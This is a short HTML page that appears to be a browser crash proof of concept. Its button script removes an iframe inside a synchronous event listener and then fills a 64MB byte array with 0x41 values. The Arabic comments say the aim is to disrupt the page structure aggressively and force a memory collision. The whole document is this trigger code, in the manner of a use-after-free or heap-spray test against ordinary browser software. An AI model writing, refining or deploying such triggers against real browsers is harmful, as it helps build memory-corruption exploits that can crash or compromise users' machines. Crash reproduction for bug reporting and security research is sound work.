<!DOCTYPE html>
<html>
<body>
    <button onclick="main()">Click to trigger (Force Crash)</button>
    <div id="status">Status: Waiting...</div>

    <script>
        function main() {
            const f = document.body.appendChild(document.createElement('iframe'));
            const a = document.createElement('div');
            
            // إضافة Listener يقوم بتغيير الهيكلية بشكل أكثر عدوانية
            a.addEventListener('a', () => {
                f.remove(); // الحذف الفوري
                
                // تخصيص ذاكرة ضخمة جداً في نفس اللحظة
                try {
                    let trash = new Uint8Array(1024 * 1024 * 64); // 64MB لفرض تصادم الذاكرة
                    for(let i=0; i<trash.length; i++) trash[i] = 0x41;
                } catch(e) {}
            });

            // إرسال الحدث
            a.dispatchEvent(new Event('a'));
        }
    </script>
</body>
</html>
